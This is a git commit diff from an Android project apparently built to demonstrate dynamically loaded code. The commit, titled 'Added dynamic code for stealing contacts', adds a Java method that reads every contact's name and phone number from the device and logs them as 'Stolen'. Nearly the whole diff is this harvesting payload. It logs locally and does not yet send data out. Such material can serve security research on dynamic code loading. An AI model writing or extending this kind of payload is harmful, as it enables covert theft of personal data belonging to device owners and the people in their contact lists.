20bff1f65de7e03692010ad0f17285ca4f172be5
Manwel Bugeja <manwelbugeja@Manwels-MBP-2.lan>
2022-07-27 18:49:01 +0200

    Added dynamic code for stealing contacts

--- DynamicCode/app/src/main/java/com/example/dynamiccode/UploadContacts.java
+++ DynamicCode/app/src/main/java/com/example/dynamiccode/UploadContacts.java
@@ -1,10 +1,53 @@
 package com.example.dynamiccode;
 
+import android.annotation.SuppressLint;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.database.Cursor;
+import android.provider.ContactsContract;
 import android.util.Log;
+
+import java.util.HashMap;
 
 public class UploadContacts {
     public static String TAG = "DYNAMIC_CODE";
-    public void testFn() {
+    public static void testFn() {
         Log.i(TAG, "Code successfully running");
+    }
+
+    @SuppressLint("Range")
+    public static void uploadContacts(Context context) {
+        Log.i(TAG, "Got context: " + context.toString());
+        ContentResolver cr = context.getContentResolver();
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                    null, null, null, null);
+
+        if ((cur != null ? cur.getCount() : 0) > 0) {
+            while (cur != null && cur.moveToNext()) {
+                String id = cur.getString(
+                        cur.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = cur.getString(cur.getColumnIndex(
+                        ContactsContract.Contacts.DISPLAY_NAME));
+
+                if (cur.getInt(cur.getColumnIndex(
+                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(
+                                ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        Log.i(TAG, "Stolen Name: " + name);
+                        Log.i(TAG, "Stolen Phone Number: " + phoneNo);
+                    }
+                    pCur.close();
+                }
+            }
+        }
+        if(cur!=null){
+            cur.close();
+        }
     }
 }
